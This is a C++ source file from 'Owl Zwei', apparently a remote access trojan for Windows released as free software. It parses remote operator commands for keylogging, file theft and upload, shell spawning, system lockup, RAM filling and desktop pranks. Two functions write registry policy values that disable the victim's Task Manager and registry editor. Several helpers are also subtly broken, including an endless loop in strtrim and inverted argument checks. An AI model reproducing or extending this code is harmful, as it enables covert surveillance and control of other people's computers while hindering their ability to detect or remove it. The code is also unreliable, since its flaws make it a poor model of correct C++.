/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "misc.h"
char owl_installed_path[2048];
/*****************************************************************************************/
HANDLE new_thread( LPTHREAD_START_ROUTINE lpFunc , LPVOID lpParam ){
	return CreateThread( NULL , 0 , lpFunc , lpParam , 0 , NULL );
}
/*****************************************************************************************/
char** split( const char *delim , const char *str , char **result ){

	int dlen = strlen(delim);
	int i = 0;
	char *p = (char*)str;
	char *q;

	while( ( q = strstr( p , delim )) != NULL ){
		if( q == p ){
			result[i++] = "";
			p += dlen;
			continue;
		}
		result[i] = new char[ q - p + 1 ];
		int j = 0;
		while( p != q ){
			result[i][j++] = *p++;
		}
		result[i][j] = '\0';
		p += dlen;
		i++;
	}
	result[i] = new char[strlen(p) + 1];
	strcpy(result[i],p);
	result[++i] = NULL;
	return result;
}
/*****************************************************************************************/
BOOL strequal( const char *s1 , const char *s2 ){
	
	char *p = (char*)s1 , *q = (char*)s2;
	
	if( strlen(s1) != strlen(s2) )
		return FALSE;
	
	BOOL ret = TRUE;

	while( *p != '\0' ){

		if( *p != *q ){
			ret = FALSE;
			break;
		}
		++p;
		++q;
	}
	return ret;

}
/*****************************************************************************************/
void strtrim( char *s ){

	char *p = s;
	char *q = p;
	while( *p ){

		while( *p == ' ' || *p == '\t' || *p == '\r' || *p == '\n' ) p++;

	}
	if( *p == '\0' ){
		s = "";
		return;
	}
	s = p;
	p = s + strlen(s) - 1;
	while( *p == ' ' || *p == '\t' || *p == '\n' || *p == '\r' ) p--;
	*(p+1) = '\0';

}
/*****************************************************************************************/
void getRidOfWS( char *s ){

	char *p;
	p = StrChr( s , 13 );
	if( p ) *p = 0;
	p = StrChr( s , '\n');
	if( p ) *p = 0;
	if( p = StrChr( s , 32 ) ) *p = 0;
	
}
/*****************************************************************************************/
void parse_cmd( const char *cmd , struct cmd_t *pCmd ){

	char *res[256];
	//MB(cmd);
	split( " " , cmd , (char**)res );

	char *p = res[0];
	char *curr = res[1];
	
	for( int i = 0 ; res[i] != NULL ; i++ ){
		getRidOfWS( res[i] );
		//MB(res[i]);
	}
	strcpy( pCmd->addnl.str , "" );
	pCmd->args = -1;

	if( strequal( p , "file" ) ){
		pCmd->cmd_object = CMD_FILE;
		if( strequal( curr , "ls" ) ){
			if( res[2] != NULL){
				if( strequal( res[2] , "ex" ) ){
					pCmd->args = FILE_SDIREX;
					if( res[3] != NULL ){
						strncpy( pCmd->addnl.str , res[3] , 256 );
					}
				}
				else{
					pCmd->args = FILE_SDIR;
					strncpy( pCmd->addnl.str , res[2] , 256 );
				}
			}
			else{
				pCmd->args = FILE_SDIR;
				strcpy( pCmd->addnl.str , "." );
			}
		}
		else if( strequal( curr , "lsdrv" ) ){
			pCmd->args = FILE_SDRV;
		}
		else if( strequal( curr , "get" ) ){
			pCmd->args = FILE_SEND;
			if( res[2] != NULL ){
				strncpy( pCmd->addnl.str , res[2] , 256 );
			}
		}
		else if( strequal( curr , "put" ) ){
			pCmd->args = FILE_RECV;
			if( res[2] != NULL ){
				strncpy( pCmd->addnl.str , res[2] , 256 );
			}
		}
		else if( strequal( curr , "mkdir" ) ){
			pCmd->args = FILE_MKDIR;
			if( res[2] != NULL ){
				strncpy( pCmd->addnl.str , res[2] , 256 );
			}
		}
	}
	else if( strequal( p , "cd" ) ){
		pCmd->cmd_object = CMD_HW;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( strequal( curr , "open" ) )
				pCmd->args = HW_OPENCD;
			else if( strequal( curr , "close" ) )
				pCmd->args = HW_CLOSECD;
		}
	}
	else if( strequal( p , "mbn" ) ){
		pCmd->cmd_object = CMD_HW;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( *curr == 'r' )
				pCmd->args = HW_MOUSE_R;
			else if( *curr == 'l' )
				pCmd->args = HW_MOUSE_L;
			else if( *curr == 's' )
				pCmd->args = HW_MOUSE_SW;
			else
				pCmd->args = -1;
		}
	}
	else if( strequal( p , "monitor") ){
		pCmd->cmd_object = CMD_HW;
		if( curr == NULL || strequal(curr,"on") )
			pCmd->args = HW_MONITOR1;
		else 
			pCmd->args = HW_MONITOR0;
	}
	else if( strequal( p , "input" ) ){
		pCmd->cmd_object = CMD_HW;
		if( curr == NULL || strequal(curr,"on") )
			pCmd->args = HW_INPUT1;
		else 
			pCmd->args = HW_INPUT0;
	}
	else if( strequal( p , "dbclk" ) ){
		pCmd->cmd_object = CMD_HW;
		pCmd->args = HW_DB_CLK;
		int t;
		if( curr != NULL )
			t = GetDoubleClickTime();
		else
			t = atoi(curr);
		pCmd->addnl.nums[0] = t;
	}
	else if( strequal( p , "reboot" ) ){
		pCmd->cmd_object = CMD_HW;
		pCmd->args = HW_REBOOT;
	}
	else if( strequal( p , "shutdown" ) ){
		pCmd->cmd_object = CMD_HW;
		pCmd->args = HW_SHTDWN;
	}
	else if( strequal( p , "keybd" ) ){
		pCmd->cmd_object = CMD_KEYBD; 
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( strequal( curr , "log" ) )
				pCmd->args = KEYBD_STARTLOG;
			else if( strequal( curr , "stop" ) )
				pCmd->args = KEYBD_STOPLOG;
		}
	}
	else if( strequal( p , "mouse" ) ){
		pCmd->cmd_object = CMD_MOUSE;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if(strequal( curr , "fly" )){
				if( res[2] != NULL ){
					if( strequal( res[2] , "off" ) )
						pCmd->args = MOUSE_FLY_STOP;
					if( strequal( res[2] , "on" ) )
						pCmd->args = MOUSE_FLY;
					if( strequal( res[2] , "clk" ) )
						pCmd->args = MOUSE_FLY_CLK;
				}else
					pCmd->args = MOUSE_FLY;
			}
			else if( strequal( curr , "restrict" ) ){
				pCmd->args = MOUSE_RESTRICT;
				if( res[2] != NULL ){
					char *ptr[10];
					split( "," , res[2] , (char**)ptr );
					for( int i = 0 ; i < 4 ; i++ )
						pCmd->addnl.nums[i] = atoi(ptr[i]);
				}
			}
			else if( strequal( curr , "click" ) ){
				if( res[2] == NULL ){
					pCmd->args = MOUSE_CLK;
				}else{
					pCmd->args = MOUSE_CLK_PT;
					char *ptr[10];
					split( "," , res[2] , (char**)ptr );
					for( int i = 0 ; i < 2 ; i++ )
						pCmd->addnl.nums[i] = atoi(ptr[i]);
				}
			}
			else if( strequal( curr , "show" ) )
				pCmd->args = MOUSE_SHOW;
			else if( strequal( curr , "hide" ) )
				pCmd->args = MOUSE_HIDE;
			else pCmd->args = -1;
		}
	}
	else if( strequal( p , "shell" ) ){
		pCmd->cmd_object = CMD_SHELL;
		pCmd->args = SHELL_SPAWN;
	}
	else if( strequal( p , "sys" ) ){
		pCmd->cmd_object = CMD_SYS;
		if( curr != NULL ){
			if( strequal( curr , "mem" ) )
				pCmd->args = SYS_MAXMEM;
			else if( strequal( curr , "fmem" ) )
				pCmd->args = SYS_FREEMEM;
			else if( strequal( curr , "bmem" ) )
				pCmd->args = SYS_BUSYMEM;
			else if( strequal( curr, "disk" ) ){
				pCmd->args = SYS_MAXDISK;
				if( res[2] != NULL ){
					strncpy( pCmd->addnl.str , res[2] , 256 );
				}else strcpy( pCmd->addnl.str , "C:" );
			}
			else if( strequal( curr , "fdisk" ) ){
				pCmd->args = SYS_FREEDISK;
				if( res[2] != NULL ){
					strncpy( pCmd->addnl.str , res[2] , 256 );
				}else strcpy( pCmd->addnl.str , "C:" );
			}
			else if( strequal( curr , "udisk" ) ){
				pCmd->args = SYS_USEDDISK;
				if( res[2] != NULL ){
					strncpy( pCmd->addnl.str , res[2] , 256 );
				}else strcpy( pCmd->addnl.str , "C:" );
			}
			else if( strequal( curr , "cd" ) ){
				pCmd->args = SYS_CHDIR;
				if( res[2] != NULL ){
					strncpy( pCmd->addnl.str , res[2] , 256 );
				}else strcpy( pCmd->addnl.str , "." );
			}
			else if( strequal( curr , "lock" ) ){
				pCmd->args = SYS_LOCKUP;
			}
			else if( strequal( curr , "ramfill" ) ){
				pCmd->args = SYS_RAMFILL;
			}
			else pCmd->args = -1;
		}else pCmd->args = -1;
	}
	else if( strequal( p , "taskbar" ) ){
		pCmd->cmd_object = CMD_TBAR;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( strequal( curr , "show" ) )
				pCmd->args = TBAR_SHOW;
			else if( strequal( curr , "hide" ) )
				pCmd->args = TBAR_HIDE;
			else if( strequal( curr , "enable" ) )
				pCmd->args = TBAR_ENABLE;
			else if( strequal( curr, "disable" ) )
				pCmd->args = TBAR_DISABLE;
			else pCmd->args = -1;
		}
	}
	else if( strequal( p , "startbn" ) ){
		pCmd->cmd_object = CMD_TBAR;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( strequal( curr , "show" ) )
				pCmd->args = TBAR_STBN_SHOW;
			else if( strequal( curr , "hide" ) )
				pCmd->args = TBAR_STBN_HIDE;
			else if( strequal( curr , "fly" ) ){
				if( res[2] == NULL )
					pCmd->args = TBAR_STBN_FLY1;
				else{
					if( strequal( curr , "on" ) )
						pCmd->args = TBAR_STBN_FLY1;
					else
						pCmd->args = TBAR_STBN_FLY0;
				}
			}
		}
	}
	else if( strequal( p , "sysclock" ) ){
		pCmd->cmd_object = CMD_TBAR;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( strequal( curr , "show" ) )
				pCmd->args = TBAR_CLOCK_SHOW;
			else if( strequal( curr , "hide" ) )
				pCmd->args = TBAR_CLOCK_HIDE;
		}
	}
	else if( strequal( p , "fu" ) ){
		pCmd->cmd_object = CMD_PRANK;
		pCmd->args = PRANK_FU_START;
		if( curr != NULL )
		{
			strncpy( pCmd->addnl.str , curr , 256 );
		}
	}
	else if( strequal( p , "fustop" ) ){
		pCmd->cmd_object = CMD_PRANK;
		pCmd->args = PRANK_FU_STOP;
	}
	else if( strequal( p , "dtp" ) ){
		pCmd->cmd_object = CMD_PRANK;
		if( curr == NULL )
			pCmd->args = -1;
		else{
			if( strequal( curr , "enable" ) )
				pCmd->args = PRANK_DTP_ENABLE;
			else if( strequal( curr , "disable" ) )
				pCmd->args = PRANK_DTP_DISABLE;
			else pCmd->args = -1;
		}
	}
	else if( strequal( p , "quake" ) ){
		pCmd->cmd_object = CMD_PRANK;
		pCmd->addnl.nums[0] = 0;
		if( curr == NULL )
			pCmd->args = PRANK_QUAKE_START;
		else{
			if( strequal( curr , "on" ) )
				pCmd->args = PRANK_QUAKE_START;
			else if( strequal( curr , "off" ) )
				pCmd->args = PRANK_QUAKE_STOP;
			else pCmd->args = -1;
		}
	}
	else if( strequal( p , "sprint" ) ){
		pCmd->cmd_object = CMD_PRANK;
		pCmd->addnl.nums[0] = 0;
		if( curr == NULL )
			pCmd->args = PRANK_WRUN_START;
		else{
			if( strequal( curr , "on" ) )
				pCmd->args = PRANK_WRUN_START;
			else if( strequal( curr , "off" ) )
				pCmd->args = PRANK_WRUN_STOP;
			else pCmd->args = -1;
		}
	}
	else if( strequal( p , "owl" ) ){
		pCmd->cmd_object = CMD_OWL;
		if( curr == NULL )
			pCmd->args = -1;
		else if( strequal( curr , "uninstall" ) )
			pCmd->args = OWL_UNINSTALL;
	}
	
}
/*****************************************************************************************/
void DisableTaskMgr( bool disable ){
	DWORD d = (disable == true) ? 1 : 0;
	HKEY hKey;
	int n = RegOpenKeyEx( HKEY_CURRENT_USER , "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 
					KEY_ALL_ACCESS , &hKey );
	if( n != ERROR_SUCCESS )
		return;
	RegSetValueEx( hKey , "DisableTaskmgr" , 0 , REG_DWORD , (LPBYTE)(&d) , sizeof(d) );
	RegCloseKey( hKey );
}
/*****************************************************************************************/
void DisableRegistryEditing( bool disable ){
	DWORD d = (disable == true) ? 1 : 0;
	HKEY hKey;
	int n = RegOpenKeyEx( HKEY_CURRENT_USER , "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 
					KEY_ALL_ACCESS , &hKey );
	if( n != ERROR_SUCCESS )
		return;
	RegSetValueEx( hKey , "DisableRegistryTools" , 0 , REG_DWORD , (LPBYTE)(&d) , sizeof(d) );
	RegCloseKey( hKey );
}
/*****************************************************************************************/
